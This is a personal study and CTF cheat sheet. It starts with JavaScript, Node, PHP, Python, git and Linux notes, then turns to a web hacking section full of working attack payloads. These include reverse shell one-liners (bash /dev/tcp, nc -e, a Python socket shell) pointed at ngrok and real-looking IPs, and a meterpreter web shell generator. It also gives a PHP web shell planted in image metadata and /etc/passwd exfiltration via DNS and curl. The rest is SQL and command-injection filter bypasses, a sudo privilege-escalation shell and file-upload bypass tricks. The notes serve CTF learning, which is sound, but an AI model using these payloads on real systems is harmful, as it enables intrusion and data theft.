
## LINKS
```https://d00mfist1.gitbooks.io/ctf/content/basics_of_linux.html
https://github.com/zjgcjy/CTF-pwn-tips
https://www.yeahhub.com/top-steganography-tools-ctf-challenges/
https://ethackal.github.io/2015/10/05/derbycon-ctf-wav-steganography/
https://blog.certcube.com/cheatsheet-lfi-to-rce-websheels/
https://hashes.com/en/tools/hash_identifier
https://en.wikipedia.org/wiki/File:ASCII-Table.svg - ascii table```




## **PROGRAMMING LANGUAGES**

                        
                        
                        
                        
                        
                            ======================

                            JAVASCRIPT PROGRAMMING

                            ======================

    
    Main page for reference 
    mdn web docs - javascript reference 
    
    FUNCTIONS AND USEFUL TIPS
    *************************
    prompt allows a user to enter input
    string.slice(1) - Prints from index 1(second letter) to the last index
	parseInt - Converts strings to int
	parseFloat - Converts string / int to float
    number.toString()   _ Converts integers to string
	event.target - Gives the current element that has been clicked e.g querySelector('button').addEventlistener('click',function(){console.log(event.target.parentNode)})
	item.length - Give the length of arrays,cookies,strings etc
	typeof(item) - Gives the type of data of the selected item
	item.children - Gives the children of the item.Use an array to iterate between the items

    Adding or merging two array in javascript
        let merged=array1.concat(array2);
    
    
    for (var key in array/object){
        console.log(array/object[key])
    }



    JAVASCRIPT STRINGS
    ******************
    
    Format printing in javascript
    console.log(`Name ${name}`)
        Converting strings to upper case and lower case
        where string is 'allan njuguna'
            string.toLowerCase()
            string.toUpperCase()
            string.startsWith('allan') - returns true
            string.endsWith('njuguna') - returns true
            strings.includes('g') - returns true
            firstname.repeat(5) - repeats firstname 5 times
        Splitting a string to an array
            array=string.split('.')
        
            
    JAVASCRIPT ARRAYS
    *****************
    Joining elements of an array to a string
        array.join(' ')
        Looping through an array in javascript
            for (var user of users){
                console.log(user)
            }
            
            for (var [index,value] of users){
                console.log(`${index}   ${value}`)
            }
            
        ADDING OR MERGING TWO ARRAYS IN JS
        ----------------------------------
            let merged=array1.concat(array2);
            let merged=[...array1,...array2];//Using spread operators
            
     ARRAY FUNCTIONS IN JAVASCRIPT
    *****************************
        Old Maps
        --------
            let numbers=[1,2,3,4,5];
            numbers.map(function(n){return n});

        New Maps with functions
        -----------------------
        
            numbers.map(n => n - 5)
            numbers.map((n,index) => console.log('The value of n is : '+n+' and the value of the Index is '+ index))

            let newmap=numbers.map((n,index) => {
                //function goes here
            });

 
            Document.querySelector('.classname').addEventListener('click',() => {
                //function goes here
            })

 
    New Maps
    --------
        let person=new Map();
        //Setting values in a map
            person.set('question','What is my name?')
            person.set(1,'Allan')
            person.set(2,'Njuguna')
            person.set(3,'Njuguna Allan')
            person.set(4,'Allan Njuguna')
            person.set('Answer','Allan Njuguna')
            person.set(true,'The answer is correct')
            person.set(false,'The answer is invalid')


        //Iterating through maps
            person.forEach((item,index) => console.log(`The key is ${index} while the value is ${item}`))
        //or
            for (let [item,index] of person){
                console.log(`The key is ${item} while the value is ${index}`)
            }


        //Getting values in the map
            person.get('Answer') //Add console.log
        //Getting the size of map
            console.log(person.size)
        //Deleting the 4th element
            person.delete(4) // or person.delete('Answer')
        //Deleting all contents  of the map
            person.clear();

        //Finding a key in maps
            console.log(person.has('Answer')) // Returns true or false .use with if else


        //Accepting and verifying input
            const ans='Njuguna'
            let check=(ans === person.get('Answer'))
            console.log(person.get(check))


 
 
     DESTRUCTURING IN JAVASCRIPT
     ***************************

     Destructuring arrays
            Old method
                var allan=['Allan','student'];
                var name=allan[0];
                var role=allan[1];

            New method
            let [name,role]=['allan','student'];

     Destructuring objects
        Old method
            const obj={
                firstname:'njuguna',
                lastname:'allan'
            };

        let {firstname,lastname}=obj;
        console.log(firstname);

        New method
        



     JAVASCRIPT SPREAD OPERATORS
     ***************************
     Passing an array to a function in javascript

            OLD METHOD
            ----------
                let calculate=function(a,b,c,d){
                    let sum=a+b+c+d;
                    let sum=sum.toString();
                    return sum;
                }
            let array=[1,2,3,4];
             let result = calculate.apply(null,array); //Where 1 to 4 is the array

            NEW METHOD(SPREAD OPERATOR)
            ---------------------------

            let result=calculate(...array);



                //Convert object to array
                let newarray=Array.prototype.slice.call(object)
                 function(){
                    console.log(arguments) //gives all the arguments entered
                 }




        JAVASCRIPT REST PARAMETERS
        **************************
        
         OLD METHOD
         ----------
            (Returns object instead of an array)

            let simple=function(){
                    console.log(arguments); //Arguments here is an object
                    console.log(typeof(arguments))
                    //Converting the object to array
                    let newarray=Array.prototype.slice.call(arguments)
                    //Displaying contenrs of the array
                    newarray.forEach((item) => console.log(item))    
                }
                
                
                //Calling the function
                simple(32,32432,324234,234234)
                    
        NEW METHOD
        ----------
        
            let easy=function(...arguments){
                console.log(arguments) //Returns all the args entered in the function in array
                arguments.forEach((item) => console.log(item)) //Prints each item in the array
            }

 
            //Calling the function
            easy(1,2,3,4)
 
    JAVASCRIPT OBJECTS
    ******************
    
        showing values of an object(person) in javascript
        
        let person={
            name:'njuguna',
            age:21,
        }


        person.name will print njuguna
        Object.keys(person) will print name and age
        Object.values(person) will print njuguna and 21
        Name and age are the keys of the object while njuguna and 21 are the values of the object

            console.log(JSON.stringify(person)) - Converts an object to json format
            console.log(person.name)
            Printing all values of the object at once
            console.log(Object.values(person))
            
        //Iterating through an object
            for (const key in users){
                console.log(key +' '+ users[key])
            }
            
            
            JSON.parse(json) - Converts json data to objects or
                Converts text('{ "name":"John", "age":30, "city":"New York"}') to object
            JSON.stringify(object) - Converts object to json



    LOGICAL OPERATIONS IN JAVASCRIPT
    ********************************
    
        And is represented as &&
        Or is represented as ||


    IMPORTING STUFF IN JAVASCRIPT
    *****************************
    
    file math.js
        export  var add=function(n1,n2){
        return n1+n2
        }
    
    
    file index.js
        import * as Math from ./math;
        import {add,subract} from '.math';
        
    Place the files in the app/js folder    
 
                OR 
                
    person.js(Sourcefile)
        //Function
            let sayname=function(name){
                return `Your name is ${name}`
            }

        //File Exports
            module.exports={sayname};
            module.exports.userid='nothing';
            module.exports.person={name:'njugna',username:'allan'}
        
    index.js(Main file)
        //Importing functions
            const file=require('./person.js')
        //Importing variables,functions and objects
        console.log(file.sayname('allan'));
        console.log(file.userid);
        console.log(file.person);
    
 
 
    JAVASCRIPT CLASSES
    ******************
    
 
     class Person {

        constructor (name,role,occupation){
            this.name=name;
            this.role=role;
            this.occupation=occupation;
            //or
            this.display=function(){
                //Add your function here
            }
        }

        display(){

            console.log('The name is '+this.name);
             console.log('The role is '+this.role);
             console.log('The occupation is '+this.occupation);
        }


    }


    let allan=new Person('Allan Njuguna','admin','student')
    allan.display()
 
 
 
 
 
 
     JAVASCRIPT ASYNCHRONOUS
     ********************** 
     
         //setTimeout function takes a callbackfunction and time to wait (Asynchronous js requires a callback)
         setTimeout(() => {console.log('This is async')},2000)
 
    
        OLD METHOD
            
 
 
 
 
 
 
 
 
 
 
 
 
 
                            ==================

                            NODEJS PROGRAMMING

                            ==================
 
     
     Node commands
        node --version => Checks the node version installed
        npm install => Installs modules listed in the package.json file
        npm install uuid => Installs a module named uuid.This creates a node_modules folder and adds the module files there as a dependencies
        npm init => Initialises a project
        npm install -D nodemon => Installs nodemon helps us avoid restarting the server
        
     
     
     
     NODE PATH
     +++++++++
     
        const path=require('path');
        
        
        __dirname                   - Prints the full path without the filename
        __filename                  - Prints the full path with the filename in the end
        path.basename(__filename)   - Prints only the filename
        path.dirname(__filename)    - Prints the full path only without the filename
        path.extname(__filename)    - Prints the file extension only
     
        Creating a path object
            console.log(path.parse(__filename));
            
        Concatentate paths/Creating new paths
            Current path: C:\Users\Administrator\Documents\nodelessons
            Destination path : C:\Users\Administrator\Documents\nodelessons\test\hello.html
        
            console.log(path.join(__dirname,'/test','hello.html'))
     
     
     
     NODE FILE SYSTEM
     ++++++++++++++++

        const fs=require('fs')
     
         CREATING A FOLDER
            let newfolder=path.join(__dirname,'/Test');
             fs.mkdir(newfolder,{},(err) => {
                if(err) throw err;
                console.log('Folder created')

             });
             
         CREATING A FILE
            const filesystem=require('fs');
            let newfile=path.join(__dirname,'/test','test.txt');

            filesystem.writeFile(newfile,'Add content here',function(err){
                if (err) throw err;
                console.log(`New file created at ${newfile}....`)
            })

         //You can also use the filesystem.appendFile method
         
        
        SHOWING CONTENTS OF A FOLDER IN JAVASCRIPT
            let files=filesystem.readdirSync('./') -   synchronous which  Returns an array
        
            filesystem.readdir('./',(err,result) => {
                if (err) throw err;
                console.log(result)
            })
        
        
        READING FILES IN JAVASCRIPT
        let myfile=path.join(__dirname,'/test.txt');
        
        filesystem.readFile(myfile,'utf-8',function(err,data){
            if (err) throw err;
            console.log(data);
        })
        
        RENAMING FILES IN JAVASCRIPT
            let oldfile=path.join(__dirname,'/test.txt')
            let newfilename=path.join(__dirname,'/test1.txt')
            
            filesystem.rename(oldfile,newfilename,function(err){
                if (err) throw err;
                console.log('The file has been renamed')
            })
     
     
     
     NODE OS
     +++++++
        const os=require('os')
        
        let platform = os.platform()  -   Gives the platform of the operating system
        let arch = os.arch()    -   Gives the architecture of the cpu whether 32 or 64 bit
        let cpus=os.cpus()     -    Gives CPU core information(Returns an object)
        let freemem=os.freemem()    -   Gives the amount of free memory
        let totalmem=os.totalmem()  -   Gives the total memory of the computer
        let homedir= os.homedir()   -   Gives the home directory of the current user
        let uptime = os.uptime()    -   Gives the uptime of the system
        
     
     
     NODE URL 
     ++++++++
     
        const url = require('url')

        const mainurl= new URL('http://mywebsite.com:55/hello.htm?id=100&status=active');

        OR
        var mainurl=url.parse(req.url,true)


        //Serialized url
        let href=mainurl.href //Similar to mainurl.toString()
        let rootdomain=mainurl.host //Host or IP or root domain i.e (localhost:5000)
        let hostname=mainurl.hostname //Gives the hostname of the website or ip address(Lacks the port) i.e (localhost)
        let pathname=mainurl.pathname //Gives the pathname ie. (/hello.htm)
        let query=mainurl.search //Gives the query string that is names and values together ie(?id=100&status=active)


        let params=mainurl.query //Gives the params as an object
        let params=mainurl.searchParams //Gives the parameters in an object

        //Adding parameters
        mainurl.searchParams.append('user','admin')

        //Looping through parameters
        mainurl.searchParams.forEach(function(name,value){
           console.log(`${name} : ${value}`) 
        });
     

     
     
     
     NODE EVENTS
     +++++++++++
     
     
     
     
     
     
     
     
     
      
     
     NODE HTTP
     +++++++++
        const url = require('url')
        const PORT= process.env.PORT || 5000;
         const http=require('http')
         http.createServer((req,res) => {

            //Query params
              const queryObject = url.parse(req.url,true).query;
                console.log(queryObject);

            res.write('Hello World')
            res.end()
         }).listen(PORT,() => console.log('Server is up and running'))
     
     
        req.url - Returns the url that has last been visited by the user
        req.headers - This returns the request headers of the client
        res.end(content) - Can be used to write content to the page
        req.connection.remoteAddress - Gives the ip of the client
        res.writeHead(200,{ 'Content-Type': 'text/html'}) - Writes response headers of the page.You can also user application/json
        res.statusCode = 200;
        res.setHeader('Content-Type', 'text/plain');
        res.end('Hello, World!\n');
     
     
     NODE CHILDPROCESS
     +++++++++++++++++
        
     This module enables us to run system commands using our node js application
     
     const run=require('child_process')
     run.exec(command,{maxBuffer: 1024 * 500},(error,stdout,stderr) => {
        if (error){
            console.log(error.message)
        }
        if(stderr){
        console.log(stderr.message)
        }
        
        result=stdout
        console.log(result)
     })
     


     OR 

    
const { exec} = require('child_process');
const child = exec('ls', ['-lh', '/usr']);
console.log('error', child.error);
console.log('stdout ', child.stdout);
console.log('stderr ', child.stderr);
     
Node readfile vuln
https://github.com/karma9874/CTF-Writeups/tree/master/DarkCON_CTF/Web%2BCrypto



                =======
                EXPRESS
                =======
const express= require('express')
const app=express();





                            ===============

                            PHP PROGRAMMING

                            ===============

 


  header in php can be used to add custom header to header responses e.g header('admin: true')
  json_encode($arrayname)
  show_source(filename) / highlight_file(filename, true)-Returns source code of file
  scandir('/etc') - will give the contents of a folder stored in an array
  To read files in php ,use include 'filename' or file_get_contents()
  curl -H "Flag: config.php" "http://easy-php.darkarmy.xyz/index.php?nic3=/Welcome/e&bruh=show_source(array_pop(getallheaders()));"

  show_source(array_pop(getallheaders()))

  getallheaders() => Gets request headers.Returns assosicative array

  foreach($array as $index => $value) {
  echo "$index = $value<br>";
	}

 hex2bin() function in php converts text from hexadecimal to ascii.It is similar to unhexlify in python

PHP OBFUSCATION
	eval()
	assert()
	base64()
	gzdeflate()
	str_rot13()
    base64_encode()

PHP FILTER BYPASS by splitting the function name(in our case file_get_contents is forbidden)
        echo fi'.'le_get_contents("flag210d9f88fd1db71b947fbdce22871b57.php");')

PREG_REPLACE function vulnerability
         <?php
        $originalstring = 'Visit Microsoft!';
        $pattern = '/microsoft/i';
        $to='The content will be changed to this';
        echo preg_replace($pattern, $to, $originalstring);
        ?> 

    Changing /microsoft/i to /microsoft/e and the $to string to system(uname) will read to code execution i.e

        <?php
        $originalstring = 'Visit Microsoft!';
        $pattern = '/microsoft/e';
        $to='system(uname)';  // it will run eval on the string leading to code execution
        echo preg_replace($pattern, $to, $originalstring);
        ?> 



PHP OBJECT ORIENTED PROGRAMMING
    TASKS OF PHP
        Query the db and connect to it
        Handle submitted data by users
        Show the db data to the users


        Models queries the database
        View shows the contents of the database
        Controller  Handles the data submitted by user

     implode('.',$array) - implode fucntion in php is similar to the join function in python i.e
    



    array_push($arrayname,$content) - Adding values to an existing array
    json_decode($jsonstring) - Convert json to array
    array_key_exists("filename", $_POST))
    if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
    }  is an inbuilt function in PHP which is used to determine the type of an image












                            ==================

                            PYTHON PROGRAMMING

                            ==================



    STRINGS
    -------

    string[::-1] - Will reverse a string

    Finding the least numeric value in an array - min(arrayname)

    REQUESTS MODULE
    ---------------
    - Using timeouts in requests response=session.get(url,timeout=1)
        except requests.exceptions.ConnectTimeout: and requests.exceptions.ConnectionError:
    - request.get(url,auth=(username,password))
    - response = requests.put('https://pythonexamples.org/', data = {'key':'value'})
    - test_file = open("my_file.txt", "rb")
    - response=requests.post(url,data={"MAX_FILE_SIZE":"1000","filename":"l0uhhx6cek.php"},files={"form_field_name": test_file},auth=(basic_username,basic_password))
    - or username="natas16" and  password like BINARY '%admin%' -- ##

    BASE64 MODULE
    -------------
    import base64
    encoded=base64.b64encode('String to encode')
    decoded=base64.b64decode('string to decode')

    STRINGS MODULE
    --------------
    import string
    uppercase=string.ascii_uppercase
    lowercase=string.ascii_lowercase
    string.ascii_letters - will give uppercase and lowercase letters
    strings.printable - Gives all chars including sysmbols and null chars

    BINASCII MODULE
    ---------------
    Decoding hex using hexadecimal
        import binascii
        string='0x2f'
        result=binascii.unhexlify(string)


    PYTHON COLORS
    BOLD                  '\033[1m'
    UNDERLINE              '\033[4m'
    WHITE                  '\033[0m'
    GREY                  '\033[90m'
    RED                   '\033[91m'
    GREEN                '\033[92m'
    YELLOW              '\033[93m'
    BLUE                   '\03394m'
    


 
 
                            ===============

                            GIT AND GITHUB

                            ===============

     Configuration

        git config --global user.name 'xubzero'
        git config --global user.email 'allannjugush@gmail.com'



     Readme file
         echo 'First readme file ' > README.md
         git init
         git add README.md
         git commit -m 'first commit'

     git remote - Checks for remote repositories
     git remote add origin https://github.com/xubzero/sample.git
     git push -u origin master
     git push
     git pull




     git init - initalises a local git repository in a folder by creating a .git folder
     git add filename - Adds file to the index
     git status -   Checks the status of the workiing tree or staging area
     git rm --cached filename - Removes a file from the staging area
     git commit - Commits changes to the index
     git commit -m 'Commit message goes here'  => Commiting without the editing part
     git push - Pushes to the remote repository
     git pull - Pulls latest changes ffrom remote repository
     git clone - Clones a repository into a new folder

     .gitignore file - Add the name of the file in this file and that file will be ignore during commits (e.g log files)
clear

     git branch newbranch - Creates a new branch
     git checkout newbranch - Changes to that branch

    //Add or make changed
    //git add .
    //git commit -m 'Login added'
    //git status - Check if changes were made and staging area is empty
    //git checkout master - Switch back to master.login.html and stuff in the login         branch vanishes


    git push   => Pushes any changes made
     git merge login(while in master branch)


     .git/logs/refs/heads/master => commits file
     .git/logs/HEAD

     .git/index
     git reset --hard HEAD~1 => Undo comiits one by one





     MARKDOWN GUIDE
     LINKS
     -----
        dillinger.io
        markdownguide.org/getting-started/
        https://www.markdowntutorial.com

        # head 				-Heading 
        ## subhead			-Subheading
        ###subsubhead		-subsubheading
        - sentence 			-ordered list(smalldots)
        _thisisiitalic_    	-italic text
        [text](linkhere)	- This is a link	
        `text`				- This is highlighted
        > texthere			- This has left border
        **bold**			-This text is bold
        ```highligh``		-This text is highlighted

        images
        ![Benjamin Bannekat](https://octodex.github.com/images/bannekat.png) - display the image from the source


                                    =======================

                                    LINUX AND JAIL ESCAPING

                                    =======================






    You can file recently deleted files in linux using the lsof command
    a)running lsof gives
        tail  10(pid of responsible process) wolf1  3r(3 is file descriptor) REG   0,50  20 780675 /home/wolf1/pass (deleted)
     b)This files go to proc.Access them using
        cat /proc/pid/fd/fdvalue
        cat /proc/10/fd/3
        cat /proc/10/fd/3 > outfile
    Changing to another account su - wolf2

        https://gtfobins.github.io/
        https://book.hacktricks.xyz/linux-unix/privilege-escalation
        sudo -l
        sudo -u root /usr/bin/mawk 'BEGIN {system("/bin/sh")}'



        sudo useradd test //Adding a new user to the system
        sudo passwd test //Changing the password of the new user
        sudo passwd //Changing the roots password


    FIND
    ----
        find / -perm -u=s -type f 2>/dev/null
        find / -name apache -perm -u=s -type f 2>/dev/null
        find / 2>/dev/null | grep -i 'whatyouwant'

    PIPES
    -----
        >         : direct normal output.
        2>        : direct error output.
        &>        : direct all output.

    SERVICES
    --------
        systemctl start ssh
        systemctl status ssh
        systemctl stop ssh
        /etc/init.d/cron status
        /etc/init.d/cron start
        /etc/init.d/cron stop
        service start sssh
        service --status-all

    OTHER COMMANDS
    --------------
    	- sudo su => Changes to root users
    	- sudo apt-cache search bluefish => Search for packages
    	- sudo apt-cache policy - Views the policy of an installed package
    	- find / -type f -name '*.php' => This command is case sensitive
    	- find / -type f -iname '*.php' => This command is case insensitive
    	- find / -size +1M => Finds a file larger than one mb
    	- find / -size -1M => Finds a file smaller than one mb
    	- find / -type f -maxdepth 2 -iname 'myfile' => removes the recursive feature
    	- grep -n -i "function" firstfile secondfile =>n gives the line number
    	- grep -ir -n 'cspke{.*}' foldername => Grepping folders
    	- grep -i 'stringtofind' ./*
    	- pgrep liri-browser - Returns pids on liri
    	- top
    	- ps aux

    	Passing result of a command to another command
    	find / -type f -iname "*.php" -exec grep -i -n "function" +
    	kill all liri







        - Deleting an interace ip link del docker0

    	- sudo chmod -R root:root foldername => Changes the ownership of a given folder
        - ls -ltr //Sort list by last modified
        - man echo        
        - echo -n text/file (n removes the new lines present in a sentence or file)
        - cat -n file (Numbers the lines in the file)
        - su anotheruser (Allows switching users without logging out)
        - find / -perm -u=s -type f 2>/dev/null //Finding suid files
        - find /mnt -type f -name learning 2>/dev/null
        - netstat -lptn
        - awk -F "whatisb4" '{print $2}'
        - cut -d'x' -f1 removes x and the words that come after it
        - strings file | cut -c 1-4 //Shows the first 4 characters
        - base64 < filename > outputfile
        - tsk_recover -i raw -e image.dd outputfolder => Helps recover deleted files from and image file
        - binwalk file //Checks for embeddded files in another file
        - binwalk -Me file  //Extracts files from another file 
        - xxd filename //Gives hexdump 
        - xxd -p dd.jpeg //Gives hexdump without spaces.Dump the hex and repair or edit it then fix with command below
        - xxd -r -p dump.txt > file.zip
        - zip -FF damaged.zip > fixed.zip
        - zip2john fixed.zip > hash
        - dd -f=filename.jpeg bs=1 skip=bytesindecimal > outfile 
        - tr -d "\n" file or cat file.txt | tr -d " \t\n\r"
        - strings -a -n 5 file
        - crunch 8 8 1234567890 -o wordlist.txt
        - cat file | wc -l
        - filter 7 file  (Displays words with seven characters)
        - strings filename | awk 'length($0)>15'or awk 'length($0)==7' \\Prints strings greater than 15 in length
        - sort -r filename //sort in reverse
        - echo 'whattodecode' | base64 -d
        - python -m SimpleHTTPServer 8000 (python 2)
        - python3 -m http.server 8000
        - netcat -lvp 4444 //Listening for incoming connections using netcat
        - hashcat64.exe -D 2 -m 0 hash.txt passwords.txt --status --force
        - cewl www.ignitetechnologies.in -d 2 -w foundwords.txt - (-d 2 is depth of 2 links)
        - netstat -lptnu
        - exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg
        - exiftool -all:all= image.png
        - cat file |  grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*"*
        - curl somefile.js | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*"*
        - php -S 127.0.0.1:3333 //simple php server
        - curl -s -N http://127.0.0.1:4040/status | grep -Eo "https://[0-9a-z]*\.ngrok.io"
        - netcat -lvp 4444 -Netcat listens at port 4444
        - grep -rni '{.*}'
        - sort filename | uniq - removes duplicates
        - grep '' /etc/passwd - Reading files using grep
        - head -1 /somefile | base64 - convert contents to base64
        Access localhost using 127.0.0.1,localhost,0.0.0.0







     CURL
     ----
     https://gist.github.com/subfuzion/08c5d85437d5d4f00e58

     curl https://ipinfo.io/ip - Gets ip
     whois $(curl https://ipinfo.io/ip) - Gets location details

         curl -s -I ip | grep -e 'Server: ' - Checking the server of a web app using curl (I fetch headers, -s silent mode)
         curl -H "Cookie:PHPSESSID=0j7vimrdobha0uo1s9hev5vh01" 'https://ringzer0ctf.com/challenges/212' => Passing custom headers with curl
         curl -X PUT -H "Cookie:PHPSESSID=0j7vimrdobha0uo1s9hev5vh01" 'https://ringzer0ctf.com/challenges/48'

         nc -v ip port or telnet ip 22 - gives the ssh banner of pc



        COMPRESSION AND ARCHIVING

        https://www.systutorials.com/docs/linux/man/1-compress/
        - zip -r outfile.zip file1 folder1 - Archiving files in a zip file format
        - tar -xf file03.tar.gz
        - bunzip2 -dfv file02
        - xz --decompress data.xz
        - gzip -d file02.gz
        - unxz data.xz (best) => result is data

        for compress'd data 16 bits
        cp file newfile.gz && uncompress newfile.gz


        - disposable email https://www.mailinator.com


    METASPLOIT
    ----------
        - db_rebuild_cache //fix slow searching
        - sessions -u 1 //Upgrades shell to metepreter session

     NMAP
     ----
        nmap -Pn ip => use with windows machines
        nmap -sV --script=banner/vuln ip   - (V checks for the service version)
        nmap -sT ip    - (T =tcp connection which has complete 3 way handshake) - Helps confirm the host/port is open
        nmap -sS ip    - (Does not complete the three way handshake hence is slightly stealthy)
        nmap -Pn iprange   - (This does a ping scan of the whole network)
        nmap -sT -p 80,433 ip  - (Scans only for the specified ports in the network)
        nmap -p- -T4 --max-retries 1 -Pn ip -vvv
        nmap -sV -sC -p- -v -oN output.txt ip/24
        nmap -sV -sC -p- -v ip/24 --min-rate 5000
        nmap -p- -T4 --max-retries 1 -Pn ip -vvv
        rustscan -a ip




     REVERSE SHELLS
     --------------

        msfvenom -p php/meterpreter/reverse_tcp LHOST=2.tcp.ngrok.io LPORT=10551 -e php/base64 R > mytools/phpbase64shell.php
         netcat =  nc 127.0.0.1 4444 –e /bin/bash
                    nc.exe 192.168.100.113 4444 –e cmd.exe
         bash = bash -i >& /dev/tcp/$ip/$port 0>&1
                bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
         bash = bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1' (best)

         

         bash -c 'bash -i >& /dev/tcp/3.136.65.236/6090 0>&1'
                bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'

        python=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("2.tcp.ngrok.io",14713));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'


        curl https://ipinfo.io/ip

        referal https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp

     MOUNTING AND UNMOUNTING DRIVES
     ------------------------------
        df -Th   = Checking where a device is mounted
        mount /dev/sda3 -o rw /mnt - Installing with read and write permissions
        mount -o remount,rw /mnt -Remounting the drive as rw
        umount /mnt = Unmounting where the drive is currently mounted


    INTERFACES
    ----------
        ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
        route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1 wlan0













    
    INSTALLING SSH
    --------------
        Client
            - sudo apt-get install ssh
            - ssh user@ipaddress    #if running on port 22
            - ssh user@ipaddress port 555   #if it runs on a different port
            - ssh escape@68.183.92.119 -p 22 -L 8000:10.47.0.5:80 && curl 127.0.0.1:8000
			- ssh -J escape@68.183.92.119 -p 22 escape@10.47.0.2
			- sudo ssh escape@68.183.92.119 'ls -al'
			- sudo echo "escape" | ssh escape@68.183.92.119 "awk '//' /etc/passwd "
https://www.linuxquestions.org/questions/linux-newbie-8/passing-commands-through-an-ssh-shell-in-a-bash-script-817072/


        Server
            - sudo apt-get install openssh-server #installing ssh server
            - service ssh start # starting the ssh service
            - ssh localhost # Checking if ssh server is installed on the machine
            - Changing the default ssh port 
            - Change the file /etc/ssh/sshd_config
                #Find the line 'What ports, IPs and protocols' the line below it or if not check for #ports












						----------------------
						      WEB HACKING
						---------------------

    BUGBOUNTY
        Choose a type/area to find bugs on e.g website(domain) or hardware
        Types of bugs
            Technical
                RCE
                SSRF
                XSS
                CSRF
            Non-technical
                IDORS
                Information disclosure
                Business logical errors


        Read bug bounty reports





    Bugs i can find in:
        Url 
            idor
            unrestricted redirects
            path traversal(LFI)
                - adding null bytes to end of filenames eg /etc/passwd%00
                - url encoding filenames
                - double url encoding of filenames
                - base64 encode the output to maintain the data php://filter/read=convert.base64-encode/resource=file



        Input
        eval(base64_encode())
            SQL
                Mixing with comments=' or 1=1 U/*ion*/nio/*x*/n
                if filter blocks:
                    or =>    Use || or try uppercase letters,use like ,use and,mix with comments
                        payload : admin' --

                    and =>   use && or try uppercase letters,mix with comments
                        payload :
                    spaces =>   use admin'||1=1&&username='test'||'
                    # => admin'||1=1&&username='test'||' or use /*
                    /*
                    =  =>    Use < or > e.g admin' or 1<2 --##
                    union => use blind sql or mix with comments

                    Filter(spaces) solutions(spaceto--,space2/**/,space2#)
                    https://gupta-bless.medium.com/exploiting-sql-injection-with-no-space-query-4840362d1674
                    
                        use admin'/**/--## instead of admin' --##
                         use admin'||1=1&&username='test'||'
                         use '#or#1=1#--## instead of ' or 1=1 --##
                        

                    Filter (or)
                        payload : admin' -- ##

                    Filter (or and like = -)
                        payload :  admin' /*

                    Filter (or and = like > < -)
                        payload : admin' /*

                    Filter (or and = like > < – admin)
                        payload : adm' || 'in' /*
                        payload : in(char(97,100,109,105,110))

                    Filter (or and = like > < – union admin)
                        payload : adm' || 'in' /*



                INJECTING USING INSERT METHOD(SQLITE)

                    TEMPLATE
                    insert into users(item,item,item,item) values('value1','value2','value3',' PAYLOADHERE  ') 

                    admin') union select 1,tbl_name,3 from sqlite_master -- ##
                    ' || (select sqlite_version() )) -- ##
                    ' || (select tbl_name from sqlite_master )) -- ##
                    
            XSS
            file uploads
            php injection


            COMMAND INJECTION,REQUEST SMUGGLING AND JAIL ESCAPING

                    
                    DNS SMUGGLING
                    ..............
                         - FILE=$(head -1 /etc/passwd | base64 | tr -d '=') && nslookup $FILE.phagc9i3td3tpra4ze1r59rff6ly9n.burpcollaborator.net
                         - nslookup $(cat /etc/passwd | base64 | tr -d '/n').phagc9i3td3tpra4ze1r59rff6ly9n.burpcollaborator.net


                    HTTP SMUGGLING
                    ..............
                        - FILE=$(head -1 /etc/passwd | base64 | tr -d '=') && curl http://listener:4444?result=$FILE
                        - curl http://listener:4444?result=$(head -1 /etc/passwd | base64 | tr -d '=')
                        - SOMEFILE=$(head -1 /etc/passwd | base64) && curl 'http://localhost:4444?file='$SOMEFILE 
                        - curl 'http://127.0.0.1:4444?file='$(head -1 /etc/passwd)
                        
                    JAIL ESCAPE
                    -----------
                    - Reading files
                        $(<flag.txt)
                        cat < flag.txt

                        - &
                        - && (first command has to be successful)
                        - | (redirects output of the first command to the input of the second)
                        - || (first command has to fail) also 
                        - ;
                        - 

                        Bypass without space
                        	- cat</etc/passwd
                        	- {cat,/etc/passwd}
                        	- cat$IFS/etc/passwd
                            - $(cat</etc/passwd)
                        	- echo${IFS}"RCE"${IFS}&&cat${IFS}/etc/passwd

                        Bypass characters filter via hex encoding
                        	echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"  = /etc/passwd
                        	xxd -r -p <<< 2f6574632f706173737764 = /etc/passwd
                        	cat `xxd -r -p <<< 2f6574632f706173737764` = reading /etc/passwd

                        COMMENTS https://medium.com/@hninja049/command-injection-bypass-cheatsheet-4414e1c22c99
                        	cat /e"t"c/pa"s"swd
                        	cat /etc/pas??d
                        	cat /etc/pa*wd
                        	`echo "dwssap/cte/ tac" | rev`



            Webshells
                Creating-weevely generate passwordhere shell.php
                Acessing-weevely shellhttplocation passwordhere
                
            msfvenom -p php/meterpreter/reverse_tcp LHOST=ip LPORT=port -e php/base64 -f raw > shell.php


        FORMS
            html injection
            cross site scripting
            cross site request forgery
            sql injection

        File uploads
            Remote code execution
            Downloading of source code using php to read files
            SQL injection
            Replacing files in the server using path traversal eg logos
            XXE

            	File Extensions and their vulnerabilities
            	-----------------------------------------
	            ASP / ASPX / PHP5 / PHP / PHP3: Webshell / RCE
				SVG: Stored XSS / SSRF / XXE
				GIF: Stored XSS / SSRF
				CSV: CSV injection
				XML: XXE,SSRF
				AVI: LFI / SSRF
				HTML / JS : HTML injection / XSS / Open redirect
				PNG / JPEG: Pixel flood attack (DoS)
				ZIP: RCE via LFI / DoS
				PDF / PPTX: SSRF / BLIND XXE

            	Exploiting file uploads
            	-----------------------
            		-Changing the extension of the upload file
            		-Try using double extensions eg file.pdf.php
            		-Changing the content type header of the upload file eg application/pdf to application/x-php image/png , text/plain , application/octet-stream
            		-Add a semicolon after the first extension file.asp;.jpg
            		-Adding magic bytes at the beginning of the upload file
